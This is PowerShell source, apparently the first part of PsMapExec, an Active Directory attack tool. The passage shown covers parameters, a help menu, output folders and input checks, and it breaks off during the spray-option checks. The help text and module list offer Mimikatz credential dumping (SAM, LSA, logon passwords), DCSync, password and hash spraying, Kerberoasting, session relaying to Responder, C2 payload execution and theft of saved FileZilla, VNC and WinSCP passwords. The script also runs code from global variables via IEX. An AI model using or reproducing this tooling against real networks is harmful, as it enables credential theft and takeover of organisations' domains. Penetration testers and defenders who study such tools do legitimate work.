Function PsMapExec {

    [CmdletBinding(DefaultParameterSetName = 'Default')]
    Param(
        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [String]$Command,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [String]$Targets,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [String]$Domain = "$env:USERDNSDOMAIN",

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [String]$Username,

        [Parameter(Mandatory = $False, Position = 0, ParameterSetName = 'Default')]
        [String]$Method,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [String]$Module,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [String]$Hash,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [String]$Password,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [String]$UserDomain,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [int]$Threads = 30,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [switch]$Force,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [switch]$LocalAuth,
    
        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [switch]$CurrentUser = $True,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [switch]$SuccessOnly,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [switch]$ShowOutput,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [String]$Ticket,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [Switch]$AccountAsPassword,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [Switch]$EmptyPassword,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [int]$Port,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [Switch]$NoParse,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [String]$SprayHash,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [String]$SprayPassword,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [switch]$NoBanner,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [string]$DomainController,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [int]$Timeout = 3000,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [switch]$Flush,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [switch]$Scramble,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [switch]$Rainbow,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [Switch]$Help,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [String]$Option,

        [Parameter(Mandatory = $False)]
        [ValidatePattern('^(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])(\.(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])){3}$')]
        [string]$ListenerIP,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [switch]$Elevate,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [ValidatePattern('^[cugt]+$')]
        [string]$Obfuscate,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [switch]$UserDN,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [string]$ToggleAccount,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [switch]$AddComputer,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [string]$RemoveComputer,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [string]$TargetDN,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [string]$GroupDN,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [string]$SID,

        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [switch]$Pre2k


    )


    if (-not $PSBoundParameters.ContainsKey('Method') -and $args.Count -ge 1) {
        $Module = $args[0]
    }



    function Write-Log {
        param (
            [String]$Message,
            [String]$Function
        )

        if ($VerbosePreference -ne 'Continue') {
            return
        }

        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        $logMessage = "[{0}] - {1}" -f $timestamp, $Message

        if ($Message -match "initialising") {
            Write-Host "$logMessage" -ForegroundColor "Yellow"
        }
        else {
            Write-Host $logMessage -ForegroundColor "Cyan"
        }
    }

    try {
        if ($Host.UI.RawUI.BufferSize.Height -ne 20000) {
            $Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size(120, 20000)
        }
    
    }
    catch {}


    if ($Help) {

        $HelpOutput = @("

-----------------------------------------------------------------------------------------------------------
---------------------------------------------- [ Help Menu ] ---------------------------------------------- 

Documentation: https://viperone.gitbook.io/pentest-everything/psmapexec

-----------------------------------------------------------------------------------------------------------
 Examples

 # Execute WMI commands over all systems in the domain using password authentication
   PsMapExec -Targets all -Method WMI -Username Admin -Password Pass -Command ""net user""

 # Execute WinRM commands over all systems in the domain using hash authentication
   PsMapExec -Targets all -Method WinRM -Username Admin -Hash [Hash] -Command ""net user""

 # Check RDP Access against workstations in the domain and using local authentication
   PsMapExec -Targets Workstations -Method RDP -Username LocalAdmin -Password Pass -LocalAuth

 # Dump SAM on a single system using SMB and a -ticket for authentication
   PsMapExec -Targets DC01.Security.local -Method SMB -Ticket [Base64-Ticket] -Module SAM

 # Check SMB Signing on all domain systems
   PsMapExec -Targets All -Method GenRelayList

 # Dump LogonPasswords on all Domain Controllers over WinRM
   PsMapExec -Targets DCs -Method WinRM -Username Admin -Password Pass -Module LogonPasswords

 # Use WMI to check current user admin access from systems read from a text file
   PsMapExec -Targets C:\temp\Systems.txt -Method WMI

 # Spray passwords across all accounts in the domain
   PsMapExec -Method Spray -SprayPassword [Password]

 # Spray Hashes across all accounts in the domain
   PsMapExec -Method Spray -SprayHash [Hash]

 # Spray Hashes across all Domain Admin group users
   PsMapExec -Targets ""Domain Admins"" -Method Spray -SprayHash [Hash]

 # Kerberoast 
   PsMapExec -Method Kerberoast -ShowOutput

 # IPMI
   PsMapExec -Targets 192.168.1.0/24 IPMI

-----------------------------------------------------------------------------------------------------------

 
 
 General Usage Parameters
 +---------------------+--------------+-----------------------------------------------------------------+
 | Parameter           |    Value     | Description                                                     |
 +---------------------+--------------+-----------------------------------------------------------------+
 | -Command            |    whoami    | Executes a command on the target system                         |
 | -CurrentUser        |     N/A      | Defaults to current user context without other credentials      |
 | -Domain             |    Domain    | Sets the domain for the operation, defaults to user's domain    |
 | -DomainController   |      DC      | Identifies which Domain controller to authenticate against      |
 | -Force              |     N/A      | Forces execution with domain admin credentials                  |
 | -Flush              |     N/A      | Clears LDAP variables for long-term, large environments         |
 | -Module             |    Module    | Specifies the module for command execution                      |
 | -NoBanner           |     N/A      | Hides the script banner                                         |
 | -NoParse            |     N/A      | Avoids parsing some module outputs                              |
 | -Rainbow            |     N/A      | Uses online rainbow tables for specific module hash analysis    |
 | -SuccessOnly        |     N/A      | Shows only successful results                                   |
 | -Timeout            |     int      | Sets the port scan timeout in milliseconds                      |
 | -Threads            |     int      | Determines thread count, default is 30                          |
 +---------------------+--------------+-----------------------------------------------------------------+
 
 Methods (PsMapExec -Method WMI etc...)
 +---------------------+--------------------------------------------------------------------------------+
 | Method              | Description                                                                    |
 +---------------------+--------------------------------------------------------------------------------+
 | DCSync              | DCSync all users or a single user against a specified DC                       |
 | Inject              | Inject a Base64 encoded Kerberos ticket                                        |
 | RDP                 | Check RDP access with specified username and password                          |
 | SMB                 | Check access or execute commands and modules over SMB                          |
 | Spray               | Spray hashes or passwords against all users or specified groups                |
 | WinRM               | Check access or execute commands and modules over WinRM                        |
 | WMI                 | Check access or execute commands and modules over WMI                          |
 +---------------------+--------------------------------------------------------------------------------+


 Authentication Parameters
 +---------------------+--------------+-----------------------------------------------------------------+
 | Parameter           |    Value     | Description                                                     |
 +---------------------+--------------+-----------------------------------------------------------------+
 | -Hash               | RC4 or AES   | Hash value. Must be supplied with -Username                     |
 | -LocalAuth          |     N/A      | Specifies local account authentication                          |
 | -Password           |   Password   | Password value. Must be supplied with -Username                 |
 | -Ticket             |    Ticket    | B64 encoded Kerberos ticket for authentication.                 |
 +---------------------+--------------+-----------------------------------------------------------------+

 Command execution Parameters (PsMapExec -Method [WMI/SMB/WinRM] -Command whoami / -Module lsa)
 +---------------------+--------------+-----------------------------------------------------------------+
 | Parameter           |    Value     | Description                                                     |
 +---------------------+--------------+-----------------------------------------------------------------+
 | -Command            |   Command    | Runs the specified command on the remote system                 |
 | -Module             |   Module     | Specifies the module for command execution                      |
 | -ShowOutput         |     N/A      | Displays output for executed modules. Commands shown by default |
 +---------------------+--------------+-----------------------------------------------------------------+

 Module Details (PsMapExec -Targets Servers -Method WMI -Module lsa)
 +---------------------+--------------------------------------------------------------------------------+
 | Module              | Description                                                                    |
 +---------------------+--------------------------------------------------------------------------------+
 | Amnesiac            | Executes Amnesiac C2 payloads                                                  |
 | ConsoleHistory      | Dumps PowerShell console history                                               |
 | eKeys               | Dumps encryption keys from memory (Mimikatz)                                   |
 | FileZilla           | Extracts and decodes FileZilla passwords from common locations                 |
 | Files               | Lists files in common directories for each user                                |
 | KerbDump            | Dumps Kerberos tickets                                                         |
 | LogonPasswords      | Dumps logon passwords from memory (Mimikatz)                                   | 
 | LSA                 | Dumps LSA (Mimikatz)                                                           |
 | NTDS                | Executes DCsync on the remote system                                           |
 | MDF                 | Extracts account hashes from remote system MSSQL MDF files                     |
 | SAM                 | Dumps SAM hashes                                                               |
 | SCCM                | Dumps NAA credentials and task sequences                                       |
 | VNC                 | Extracts and decrypts VNC passwords from common locations                      |
 | WinSCP              | Extracts and decrypts WinSCP passwords from common locations                   |
 +---------------------+--------------------------------------------------------------------------------+


 Spraying Parameters (PsMapExec -Method Spray -SprayPassword Password123)
 +---------------------+--------------+-----------------------------------------------------------------+
 | Parameter           |    Value     | Description                                                     |
 +---------------------+--------------+-----------------------------------------------------------------+
 | -AccountAsPassword  |      N/A     | Sprays SAM Account names as passwords                           |
 | -EmptyPassword      |      N/A     | Sprays blank passwords                                          |
 | -SprayHash          | RC4/AES/NTLM | defines the hash value for spraying                             |
 | -SprayPassword      |   Password   | defines the password value for spraying                         |
 +---------------------+--------------+-----------------------------------------------------------------+

 ---------------------------------------------- [ End Menu ] ----------------------------------------------- 
 -----------------------------------------------------------------------------------------------------------

")

        $HelpOutput | Write-Output
        return

    }

    if (!$Method) {
    
        Write-Host
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "You must provide a value for -Method"
    
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Run ""PsMapExec -help"" for command line usage"
        Write-Host
    
        return
    
    }

    $startTime = Get-Date
    Set-Variable MaximumHistoryCount 32767

    # Set the targets variable if not provided when spraying
    if ($Method -eq "Spray" -and [string]::IsNullOrWhiteSpace($Targets)) {
        $Targets = "all"
    }

    # Set target to "127.0.0.1" when localhost is specified
    if ($Targets -eq "localhost") {
        $Targets = "127.0.0.1"
    }

    # Check if targeting the local system (127.0.0.1)
    if ($Targets -eq "127.0.0.1") {

        # Check if user is SYSTEM or a local administrator
        $Principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
        if (-not ([Security.Principal.WindowsIdentity]::GetCurrent().Name -eq "NT AUTHORITY\SYSTEM" -or 
                $Principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))) {

            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            return "Ensure this script is run with administrative privileges when targeting the local system."
        }
    }




    ################################################################################################################
    ###################################### Banner and version information ##########################################
    ################################################################################################################

    $Banner = @("
  _____   _____ __  __          _____  ________   ________ _____ 
 |  __ \ / ____|  \/  |   /\   |  __ \|  ____\ \ / /  ____/ ____|
 | |__) | (___ | \  / |  /  \  | |__) | |__   \ V /| |__ | |     
 |  ___/ \___ \| |\/| | / /\ \ |  ___/|  __|   > < |  __|| |     
 | |     ____) | |  | |/ ____ \| |    | |____ / . \| |___| |____ 
 |_|    |_____/|_|  |_/_/    \_\_|    |______/_/ \_\______\_____|
                                                                 

Github  : https://github.com/The-Viper-One
Version : 0.8.0")

    # Display banner once then prevent for consecutive execution
    Function DisplayBanner {
    
        if ($Global:DoNotShowBanner -gt 0) { Write-Output "" ; return }
    
        Write-output $Banner
        [int]$Global:DoNotShowBanner = 1
    }

    DisplayBanner


    ################################################################################################################
    ########################################### Initial Directory Setup ############################################
    ################################################################################################################

    $WorkingDirectory = (Get-Item -Path ".\").FullName


    try {
        $testFilePath = Join-Path $WorkingDirectory "Test.PME"
        New-Item -ItemType "File" -Name "Test.PME" -Path $WorkingDirectory -Force -ErrorAction "Stop" | Out-Null
        Remove-Item -Path $testFilePath -Force | Out-Null
    }
    catch {
        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Current directory is not writeable, change to a different directory and try again"
        return
    }

    $PME = Join-Path $WorkingDirectory "PME"
    $BloodHound = Join-Path $PME "BloodHound"
    $ConsoleHistory = Join-Path $PME "Console History"
    $DCSyncDir = Join-Path $PME "DCSync"
    $DCSyncFullDump = Join-Path $DCSyncDir "DCSync_Full_Dump"
    $DCSyncUser = Join-Path $DCSyncDir "DCSync_User_Dump"
    $ekeys = Join-Path $PME "eKeys"
    $FileZilla = Join-Path $PME "FileZilla"
    $IPMI = Join-Path $PME "IPMI"
    $Kerberoast = Join-Path $PME "Kerberoast"
    $LogonPasswords = Join-Path $PME "LogonPasswords"
    $LSA = Join-Path $PME "LSA"
    $LSADump = Join-Path $LSA "LSA-Dump"
    $LSATrust = Join-Path $LSA "LSA-Trusts"
    $MDF = Join-Path $PME "MDF"
    $MSSQL = Join-Path $PME "MSSQL"
    $NotePad = Join-Path $PME "Notepad"
    $NTLM = Join-Path $PME "NTLM"
    $RDP = Join-Path $PME "RDP"
    $SAM = Join-Path $PME "SAM"
    $SCCM = Join-Path $PME "SCCM"
    $SessionExec = Join-Path $PME "SessionExec"
    $SessionRelay = Join-Path $PME "Relay"
    $Sessions = Join-Path $PME "Sessions"
    $SMB = Join-Path $PME "SMB"
    $Spraying = Join-Path $PME "Spraying"
    $SSH = Join-Path $PME "SSH"
    $TGTDeleg = Join-Path $PME "TGTDeleg"
    $Tickets = Join-Path $PME "Tickets"
    $TimeRoast = Join-Path $PME "TimeRoast"
    $UserFiles = Join-Path $PME "User Files"
    $VNCRoot = Join-Path $PME "VNC"
    $VNCDump = Join-Path $VNCRoot "VNC Dump"
    $VNC = Join-Path $VNCRoot "VNC NoAuth"
    $Wifi = Join-Path $PME "Wi-Fi"
    $WinSCP = Join-Path $PME "WinSCP"

    $directories = @(
        $BloodHound,
        $ConsoleHistory,
        $DCSyncDir,
        $DCSyncFullDump,
        $DCSyncUser,
        $ekeys,
        $FileZilla,
        $IPMI,
        $Kerberoast,
        $LogonPasswords,
        $LSA,
        $LSADump,
        $LSATrust,
        $MDF,
        $MSSQL,
        $NotePad,
        $NTLM,
        $RDP,
        $SAM,
        $SCCM,
        $SessionExec,
        $SessionRelay,
        $Sessions,
        $SMB,
        $Spraying,
        $SSH,
        $TGTDeleg,
        $Tickets,
        $TimeRoast,
        $UserFiles,
        $VNC,
        $VNCDump,
        $Wifi,
        $WinSCP
    )


    # Create PME Root folder first before populating
    if (-not (Test-Path $PME)) {
        New-Item -ItemType Directory -Force -Path $PME | Out-Null
        Write-Host
        Write-Host "[+] " -ForegroundColor "Green" -NoNewline
        Write-Host "Created directory for PME at $PME"
        Write-Host
        Start-sleep -seconds "3"
    }

    # Now create the subdirectories
    foreach ($directory in $directories) {
        if (-not (Test-Path $directory)) {
            Write-Log "Creating directory $directory"
            New-Item -ItemType Directory -Force -Path $directory | Out-Null
        }
    }


    #Create the initial template for collected Bloodhound queries
    Create-QueryTemplate

    ################################################################################################################
    ########################################### Misc Pre-setup Commands ############################################
    ################################################################################################################
    
    $Global:Encrypt | IEX
    $Global:rbs | IEX

    ################################################################################################################
    ########################################### Misc Variable Collection ###########################################
    ################################################################################################################

    if ($Username -like "*@*") {
    
        $UserDomain = $Username.Split('@')[1]
        $Username = $Username.Split('@')[0]
    
    }

    function Test-DomainJoinStatus {
        if ((Get-WmiObject Win32_ComputerSystem).PartOfDomain) {
            return $true
        }
        else {
            return $false
        }

    }

    $DomainJoined = Test-DomainJoinStatus

    $Klist = -not (& klist | Select-String -Pattern "Cached Tickets: \(0\)")
    if (!$klist) { Write-Log -Message  "No Kerberos tickets in cache" }

    Function Inform-Inject {

        if (!$Klist -and $Method -ne "Inject") {
            Write-Host
            Write-host "[*]  " -ForegroundColor "Yellow" -NoNewline
            Write-Host "For non-domain systems, use -Method ""Inject"" for PsMapExec to function correctly."
            Write-Host
            Write-host "[*]  " -ForegroundColor "Yellow" -NoNewline
            Write-Host "PsMapExec -Domain Security.local -Method Inject -Username User -Password Pass"
            Write-host "[*]  " -ForegroundColor "Yellow" -NoNewline
            Write-Host "PsMapExec -Domain Security.local -Method Inject -Username User -Hash Hash"
            Write-host "[*]  " -ForegroundColor "Yellow" -NoNewline
            Write-Host "PsMapExec -Domain Security.local -Method Inject -Ticket [Base64 ticket / Path to ticket]"
            break
        }
        return
    }

    if ($DomainJoined) {
        if ($NoBanner) { Write-Output "" }
        #Write-Output "Domain  : Yes"
    }
    elseif (!$DomainJoined) {
        if ($NoBanner) { Write-Output "" }
        #Write-Output "Domain  : No"
        Inform-Inject
        if ($Global:SkipRestoreTicket -eq $null) { $Global:SkipRestoreTicket = $false }
    }

    function Flush {
        Write-Log -Message  "[Flush] LDAP flushed"

        # Reset group membership variables
        $Global:DomainAdmins = $null
        $Global:EnterpriseAdmins = $null
        $Global:ServerOperators = $null
        $Global:AccountOperators = $null
        $FQDNDomainPlusDomainAdmins = $null
        $FQDNDomainPlusEnterpriseAdmins = $null
        $FQDNDomainPlusServerOperators = $null
        $FQDNDomainPlusAccountOperators = $null

        # Additional groups
        $Global:HyperVAdministrators = $null
        $Global:StorageReplicateAdministrators = $null
        $Global:SchemaAdmins = $null
        $Global:KeyAdmins = $null
        $Global:EnterpriseKeyAdmins = $null
        $Global:DnsAdmins = $null
        $Global:DHCPAdministrators = $null
        $FQDNDomainPlusHyperVAdministrators = $null
        $FQDNDomainPlusStorageReplicateAdministrators = $null
        $FQDNDomainPlusSchemaAdmins = $null
        $FQDNDomainPlusKeyAdmins = $null
        $FQDNDomainPlusEnterpriseKeyAdmins = $null
        $FQDNDomainPlusDnsAdmins = $null
        $FQDNDomainPlusDHCPAdministrators = $null

        # Additional groups
        $Global:GroupPolicyCreatorOwners = $null
        $Global:BackupOperators = $null
        $Global:CertPublishers = $null
        $Global:PrintOperators = $null
        $Global:OrganizationManagement = $null
        $Global:ServerManagement = $null
        $FQDNDomainPlusGroupPolicyCreatorOwners = $null
        $FQDNDomainPlusBackupOperators = $null
        $FQDNDomainPlusCertPublishers = $null
        $FQDNDomainPlusPrintOperators = $null
        $FQDNDomainPlusOrganizationManagement = $null
        $FQDNDomainPlusServerManagement = $null

        # Reset isChecked flags to 0
        $Global:DomainAdminsChecked = 0
        $Global:EnterpriseAdminsChecked = 0
        $Global:ServerOperatorsChecked = 0
        $Global:AccountOperatorsChecked = 0
        $Global:HyperVAdministratorsChecked = 0
        $Global:StorageReplicateAdministratorsChecked = 0
        $Global:SchemaAdminsChecked = 0
        $Global:KeyAdminsChecked = 0
        $Global:EnterpriseKeyAdminsChecked = 0
        $Global:DnsAdminsChecked = 0
        $Global:DHCPAdministratorsChecked = 0
        $Global:GroupPolicyCreatorOwnersChecked = 0
        $Global:BackupOperatorsChecked = 0
        $Global:CertPublishersChecked = 0
        $Global:PrintOperatorsChecked = 0
        $Global:OrganizationManagementChecked = 0
        $Global:ServerManagementChecked = 0

        # Reset target variables
        $Global:TargetsServers = $null
        $Global:TargetsWorkstations = $null
        $Global:TargetsDomainControllers = $null
        $Global:TargetsAll = $null


    }

    [int]$Global:SuccessCount = 0
    [int]$Global:AccessDeniedCount = 0
    [int]$Global:AttemptedCount = 0


    Function LastDomain {

        <#
.SYNOPSIS
Tracks domain name changes and flushes stored LDAP queries when a new domain is detected.

.DESCRIPTION
The LastDomain function is designed to manage and track the domain name currently being processed. 
It ensures that LDAP query results stored in memory are relevant to the current domain. 
If a change in the domain name is detected compared to the last run, the function triggers a flush operation. 
This flush operation clears the stored LDAP queries to prevent the reuse of results from a different domain.
#>
        param ($Domain)
    
        if ($null -eq $Global:LastDomain) {
            $Global:LastDomain = $null
            Write-Log -Message  "Initialized $Global:LastDomain to null since it was not previously set"
        }

        if ($Global:LastDomain -ne $Domain) {
            if ($Global:LastDomain -ne $null) {
                Write-Log -Message  "[LastDomain] Domain change detected. Previous domain: '$Global:LastDomain', New domain: $Domain"
                Flush
            }
            else {
                Write-Log -Message  "This is the first run or $Global:LastDomain was previously null. Setting domain to $Domain"
            }
            $Global:LastDomain = $Domain
        }
        else {
            if ($Global:LastDomain -eq $null) {
                Write-Log -Message  "[LastDomain] No previous domain set. Initializing $Global:LastDomain with $Domain"
                $Global:LastDomain = $Domain
            }
            else {
                Write-Log -Message  "[LastDomain] No domain change detected. Continuing with cached LDAP queries"
            }
        }
    }

    LastDomain -Domain $Domain

    <# 
    Ideally, when UserDomain is populated we can could track queried LDAP objects.
    The easier option for the moment is to flush when populated so we do not pollute
    the ldap queries with objects from a different domain
    #>
    if ($Flush -or $UserDomain -ne "") { Flush }

    # If no targets have been provided
    if (-not $Targets -and $Method -ne "Spray" -and $Method -ne "Kerberoast" -and $Method -ne "Inject") {
    
        Write-Host
        Write-host "[*]  " -ForegroundColor "Yellow" -NoNewline
        Write-host "You must provide a value for -targets (all, servers, DCs, Workstations or an individual system FQDN)"
        return
    }

    if ($Targets -match "^\*+$") {
    
        Write-Host
        Write-host "[*]  " -ForegroundColor "Yellow" -NoNewline
        Write-Host "The target cannot consist only of asterisks. Please specify a more specific target."
        return
    }


    if ($Targets -match "^\*.*|.*\*$") { Write-Host "Targets : Wildcard matching" }
    elseif ($Targets -eq "Workstations") { Write-Host "Targets : Workstations" }
    elseif ($Targets -eq "Servers") { Write-Host "Targets : Servers" }
    elseif ($Targets -eq "DC" -or $Targets -eq "DCs" -or $Targets -eq "DomainControllers" -or $Targets -eq "Domain Controllers") { Write-Host "Targets : Domain Controllers" }
    elseif ($Targets -eq "All" -or $Targets -eq "Everything") { Write-Host "Targets : All" }
    elseif ($Targets -notmatch "\*" -and $Method -ne "Spray" -and $Method -ne "Kerberoast" -and "$Method" -ne "Inject") { $IsFile = Test-Path $Targets ; if ($IsFile) { Write-Host "Targets : File ($Targets)" } }
    Write-Output ""
    

    ################################################################################################################
    ####################################### Some logic based checking ##############################################
    ################################################################################################################
    
    # Method Validation
    if ($Method -ne "") {
        switch ($Method) {
            "All" {}
            "DCSync" {}
            "GenRelayList" {}
            "Inject" {}
            "IPMI" {}
            "Kerberoast" {}
            "LDAP" {}
            "LDAPS" {}
            "MSSQL" {}
            "RDP" {}
            "SMB" {}
            "SessionHunter" {}
            "Spray" {}
            "VNC" {}
            "WMI" {}
            "WinRM" {}
            default {
                Write-Host
                Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                Write-Host "Invalid Method specified"
                Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                Write-Host "Specify either: All, DCSync, GenRelayList, Inject, IPMI, Kerberoast, LDAP, LDAPS, MSSQL, RDP, SMB, SessionHunter, Spray, VNC, WMI, or WinRM"
                return
            }
        }
    }


    # Module Validation
    # Module Validation
    if ($Module -ne "") {
        switch ($Module) {
            "AddComputer" {}
            "AddRBCD" {}
            "AddSPN" {}
            "AddToGroup" {}
            "Amnesiac" {}
            "ConsoleHistory" {}
            "Elevate" {}
            "eKeys" {}
            "FileZilla" {}
            "Files" {}
            "KerbDump" {}
            "LogonPasswords" {}
            "LSA" {}
            "LSA-Trust" {}
            "MDF" {}
            "MAQ" {}
            "Notepad" {}
            "NTDS" {}
            "NTLM" {}
            "RemoveComputer" {}
            "RemoveFromGroup" {}
            "RemoveRBCD" {}
            "RemoveSPN" {}
            "ResetPassword" {}
            "RunAsPPL" {}
            "SAM" {}
            "SCCM" {}
            "SSH" {}
            "SessionExec" {}
            "SessionRelay" {}
            "TGTDeleg" {}
            "Test" {}
            "Tickets" {}
            "Timeroast" {}
            "ToggleAccount" {}
            "VMCheck" {}
            "VNC" {}
            "WHOAMI" {}
            "WiFi" {}
            "WinSCP" {}
            default {
                Write-Host
                Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                Write-Host "Invalid Module specified"
                Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                Write-Host "Specify either: AddComputer, AddRBCD, AddSPN, AddToGroup, Amnesiac, ConsoleHistory, Elevate, ekeys, FileZilla, Files, KerbDump, LogonPasswords, LSA, LSA-Trust, MDF, MAQ, Notepad, NTDS, NTLM, RemoveComputer, RemoveFromGroup, RemoveRBCD, RemoveSPN, ResetPassword, RunAsPPL, SAM, SCCM, SSH, SessionExec, SessionRelay, TGTDeleg, Test, Tickets, Timeroast, ToggleAccount VMCheck, VNC, WHOAMI, WiFi, or WinSCP"
                return
            }
        }
    }


    # Authentication Validation
    if ($Hash -ne "" -and $LocalAuth) {
        Write-Host
        Write-Host "[-] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Hash and Local authentication not supported"
        return
    }

    if ($Ticket -and $LocalAuth) {
        Write-Host
        Write-Host "[-] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Ticket and Local authentication not supported as tickets are intended for domain level authentication"
        return
    }

    # Module Specific Checks
    if ($Module -eq "SessionRelay") {
        if ($ListenerIP -eq "") {
            Write-Host
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "You must specify -ListenerIP ""10.10.10.100"" for a host for Session authentication to be relayed to."
            return
        }
        else {
            Write-Host
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "About to relay user Logon Sessions to the provided IP address [$ListenerIP]. Ensure Responder or Inveigh is running!"
        }
    }

    if ($Module -eq "NTDS" -and $Targets -in @("Everything", "Workstations", "all", "Servers")) {
        Write-Host
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "You must specify a single domain controller (e.g., DC01.Security.local) or 'DC', 'DCs', 'Domain Controllers' as a target when using the NTDS module"
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "For example: -Targets DCs, -Targets DC01.Security.local"
        return
    }

    # Threads Validation
    if ($Threads -lt 1 -or -not [int]::TryParse($Threads, [ref]0)) {
        Write-Host
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Threads value should not be less than 1"
        return
    }

    if ($Threads -gt 100) {
        Write-Host
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Threads value should not be more than 100. This will likely cause results to be missed."
        return
    }

    # Domain Check
    if (!$DomainJoined) {
        Write-Log " Current system is not domain joined, setting `$CurrentUser to False"
        $CurrentUser = $False
    }

    if ($Domain -eq "" -and $DomainJoined -eq $False) {
        Write-Host
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "This system appears to be a non-domain joined system. You must specify a target Domain ""-Domain Security.local"""
        return
    }

    # User Context Validation
    if ($Username -ne "" -or $Password -ne "" -or $Hash -ne "" -or $Ticket -ne "") {
        $CurrentUser = $False
    }
    if ($Method -in @("Spray", "GenRelayList", "RDP", "MSSQL")) {
        $CurrentUser = $True
    }

    # Method Specific Checks
    if ($Method -eq "" -and !$SessionHunter -and !$Spray) {
        Write-Host
        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "No method specified"
        return
    }

    if ($Method -eq "RDP") {
        if ($Hash -ne "") {
            Write-Host
            Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Hash authentication not currently supported with RDP"
            return
        }

        if ($Ticket -ne "") {
            Write-Host
            Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Ticket authentication not currently supported with RDP"
            return
        }

        if ($Username -eq "" -or $Password -eq "") {
            Write-Host
            Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "-Username and -Password parameters required when using the method RDP"
            return
        }
    }

    if ($Method -eq "VNC") {
        if ($Username -ne "" -or $Password -ne "" -or $Hash -ne "" -or $Ticket -ne "") {
            $CurrentUser = $True
            Write-Host
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Method VNC does not support authentication material, it simply checks if No Auth is enabled."
            Write-Host
        }
    }

    if ($Method -eq "Spray") {

        if (!$EmptyPassword -and !$AccountAsPassword -and $SprayHash -eq "" -and $SprayPassword -eq "" -and (!$Pre2k)) {
            Write-Host
            Write-Host "[-] " -ForegroundColor Red -NoNewline
            Write-Host "We need something to spray"
            Write-Host
            Write-Host "PsMapExec -Method Spray -SprayPassword [Password]"
            Write-Host "PsMapExec -Method Spray -SprayHash [Hash]"
            Write-Host "PsMapExec -Method Spray -AccountAsPassword"
            Write-Host "PsMapExec -Method Spray -EmptyPassword"
            return
        }

        elseif ($SprayHash -ne "" -and $SprayPassword -ne "") {
            Write-Host
            Write-Host "[-] " -ForegroundColor Red -NoNewline
            Write-Host "Hash and Password detected"
            return
        }

        elseif (($EmptyPassword -and $SprayHash -ne "") -or ($EmptyPassword -and $SprayPassword -ne "")) {
            Write-Host
            Write-Host "[-] " -ForegroundColor Red -NoNewline
            Write-Host "Password or hash value provided with -EmptyPassword"
            return
        }

        elseif (($AccountAsPassword -and $SprayHash -ne "") -or ($AccountAsPassword -and $SprayPassword -ne "")) {
            Write-Host
            Write-Host "[-] " -ForegroundColor Red -NoNewline
